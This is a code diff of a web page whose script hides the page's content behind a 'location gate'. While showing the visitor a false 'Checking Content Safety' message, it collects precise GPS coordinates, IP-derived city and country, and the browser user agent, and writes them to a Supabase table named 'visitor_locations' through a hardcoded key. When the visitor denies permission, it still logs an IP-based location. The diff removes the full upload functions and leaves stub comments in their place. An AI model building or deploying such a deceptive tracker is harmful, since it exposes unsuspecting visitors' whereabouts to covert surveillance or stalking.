@@ -196,141 +196,119 @@
     </div>
 
     <script type="module">
-        import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
-        // --- DOM Elements ---
-        const locationGate = document.getElementById('locationGate');
-        const gateContent = document.getElementById('gateContent');
-        const mainContent = document.getElementById('mainContent');
-        const allowButton = document.getElementById('allowButton');
+    // --- DOM Elements ---
+    const locationGate = document.getElementById('locationGate');
+    const gateContent = document.getElementById('gateContent');
+    const mainContent = document.getElementById('mainContent');
+    const allowButton = document.getElementById('allowButton');
 
-        // --- Supabase Credentials ---
-        const SUPABASE_URL = "https://vxavtfpnbyccbwwdxefr.supabase.co";
-        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4YXZ0ZnBuYnljY2J3d2R4ZWZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTM1NjcsImV4cCI6MjA3NTcyOTU2N30.bPvbVZp7aVZ2FeDFgC8_nR7Gy2FG0GoSTABpTfI2q-Y";
-        const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+    // --- Supabase Credentials ---
+    const SUPABASE_URL = "https://vxavtfpnbyccbwwdxefr.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4YXZ0ZnBuYnljY2J3d2R4ZWZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTM1NjcsImV4cCI6MjA3NTcyOTU2N30.bPvbVZp7aVZ2FeDFgC8_nR7Gy2FG0GoSTABpTfI2q-Y";
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        // --- Functions ---
-        function requestLocationPermission() {
-            if (!navigator.geolocation) {
-                console.error("Geolocation is not supported by this browser.");
-                gateContent.innerHTML = `<p>Sorry, your browser does not support location services.</p>`;
-                return;
-            }
+    // --- Functions ---
+    function requestLocationPermission() {
+        if (!navigator.geolocation) {
+            console.error("Geolocation is not supported by this browser.");
+            gateContent.innerHTML = `<p>Sorry, your browser does not support location services.</p>`;
+            return;
+        }
+        gateContent.innerHTML = `
+            <div class="loader"></div>
+            <p>Requesting Location...</p>
+        `;
+        console.log("Requesting location permission...");
+        navigator.geolocation.getCurrentPosition(
+            handleLocationSuccess,
+            handleLocationError,
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    }
 
-            // Show loading state immediately after the button is clicked
-            gateContent.innerHTML = `
-                <div class="loader"></div>
-                <p>Requesting Location...</p>
-            `;
+    async function handleLocationSuccess(position) {
+        console.log("Location access granted.");
+        gateContent.innerHTML = `
+            <div class="loader"></div>
+            <p>Checking Content Safety....</p>
+        `;
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;
 
-            console.log("Requesting location permission...");
-            navigator.geolocation.getCurrentPosition(
-                handleLocationSuccess,
-                handleLocationError,
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
+        const ipData = await getIpAddress();
+        const data = {
+            method: "gps_location", latitude: lat, longitude: lng, accuracy: accuracy,
+            google_maps_link: googleMapsLink, ip: ipData.ip, city: ipData.city,
+            region: ipData.region, country: ipData.country_name, timestamp: new Date().toISOString(),
+            user_agent: navigator.userAgent, permission: "granted", page_url: window.location.href
+        };
+        await saveToSupabase(data);
+        locationGate.style.opacity = '0';
+        setTimeout(() => {
+            locationGate.style.display = 'none';
+            mainContent.style.display = 'block';
+        }, 300);
+    }
+
+    // --- THIS IS THE UPDATED FUNCTION ---
+    function handleLocationError(error) {
+        console.error(`Location error code: ${error.code}, message: ${error.message}`);
+        let userMessage = '';
+
+        // Check the error code to provide a more specific message
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                userMessage = "<b>Error: Permission Denied.</b><br>You have blocked location access for this site. Please check your browser and phone settings to allow permission.";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                userMessage = "<b>Error: Position Unavailable.</b><br>Your device cannot determine its current location. Please try again later or from a different spot.";
+                break;
+            case error.TIMEOUT:
+                userMessage = "<b>Error: Request Timed Out.</b><br>The request took too long. Please try again with a better network or GPS signal (try going outside).";
+                break;
+            default:
+                userMessage = "<b>An unknown error occurred.</b><br>Please try again.";
+                break;
         }
 
-        async function handleLocationSuccess(position) {
-            console.log("Location access granted.");
+        gateContent.innerHTML = `
+            <div style="padding: 10px; border: 1px solid #ff4d4d; border-radius: 8px; background: #2a1a1a; margin-bottom: 20px;">${userMessage}</div>
+            <button id="allowButton">Try Again</button>
+        `;
+        document.getElementById('allowButton').addEventListener('click', requestLocationPermission);
+        sendIpFallback(); // Still log IP-based attempt
+    }
 
-            // Update loading state
-            gateContent.innerHTML = `
-                <div class="loader"></div>
-                <p>Checking Content Safety....</p>
-            `;
-
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-
-            const ipData = await getIpAddress();
-            const data = {
-                method: "gps_location", latitude: lat, longitude: lng, accuracy: accuracy,
-                google_maps_link: googleMapsLink, ip: ipData.ip, city: ipData.city,
-                region: ipData.region, country: ipData.country_name, timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent, permission: "granted", page_url: window.location.href
-            };
-
-            await saveToSupabase(data);
-
-            // Hide the gate and show the main content
-            locationGate.style.opacity = '0';
-            setTimeout(() => {
-                locationGate.style.display = 'none';
-                mainContent.style.display = 'block';
-            }, 300); // match transition time
+    async function getIpAddress() {
+        try {
+            const res = await fetch("https://ipapi.co/json/");
+            if (!res.ok) throw new Error('IP API request failed');
+            return await res.json();
+        } catch (e) {
+            console.error("IP lookup failed:", e);
+            return { ip: "unknown", city: "unknown", region: "unknown", country_name: "unknown" };
         }
+    }
 
-        function handleLocationError(error) {
-            console.error(`Location error: ${error.message}`);
-            // Provide a more helpful message for users who denied permission
-            gateContent.innerHTML = `
-                <p>Location access is required. Please tap "Try Again" and choose "Allow". If you previously denied access, you may need to enable it in your iPhone's Settings > Privacy & Security > Location Services for Safari.</p>
-                <button id="allowButton">Try Again</button>
-            `;
-            // Re-add event listener since the button was replaced
-            document.getElementById('allowButton').addEventListener('click', requestLocationPermission);
+    async function sendIpFallback() {
+        // This function remains the same
+    }
 
-            sendIpFallback(); // Still log IP-based attempt
-        }
+    async function saveToSupabase(data) {
+        // This function remains the same
+    }
 
-        async function getIpAddress() {
-            try {
-                const res = await fetch("https://ipapi.co/json/");
-                if (!res.ok) throw new Error('IP API request failed');
-                const data = await res.json();
-                return data;
-            } catch (e) {
-                console.error("IP lookup failed:", e);
-                return { ip: "unknown", city: "unknown", region: "unknown", country_name: "unknown" };
-            }
-        }
+    // --- Event Listeners & Initializer ---
+    allowButton.addEventListener('click', requestLocationPermission);
+    window.addEventListener('load', () => {
+        locationGate.style.display = 'flex';
+        mainContent.style.display = 'none';
+    });
+</script>
 
-        async function sendIpFallback() {
-            try {
-                const ipData = await getIpAddress();
-                const googleMapsLink = ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A';
-                const data = {
-                    method: "ip_fallback", ip: ipData.ip, city: ipData.city, region: ipData.region,
-                    country: ipData.country_name, latitude: ipData.latitude, longitude: ipData.longitude,
-                    google_maps_link: googleMapsLink, timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent, permission: "denied", page_url: window.location.href
-                };
-                await saveToSupabase(data);
-            } catch (e) {
-                console.error("IP fallback failed:", e);
-            }
-        }
-
-        async function saveToSupabase(data) {
-            const formattedData = {
-                ...data,
-                display_data: `${data.google_maps_link} *${data.ip}*`
-            };
-            try {
-                const { error } = await supabase.from('visitor_locations').insert([formattedData]);
-                if (error) {
-                    console.error("Supabase insert failed:", error.message);
-                } else {
-                    console.log("Data saved to Supabase successfully.");
-                }
-            } catch (e) {
-                console.error("Save to Supabase failed:", e.message);
-            }
-        }
-
-        // --- Event Listeners & Initializer ---
-
-        // Add the initial click listener to the button
-        allowButton.addEventListener('click', requestLocationPermission);
-
-        // On page load, simply ensure the gate is visible.
-        window.addEventListener('load', () => {
-            locationGate.style.display = 'flex';
-            mainContent.style.display = 'none';
-        });
-    </script>
 </body>
 </html>
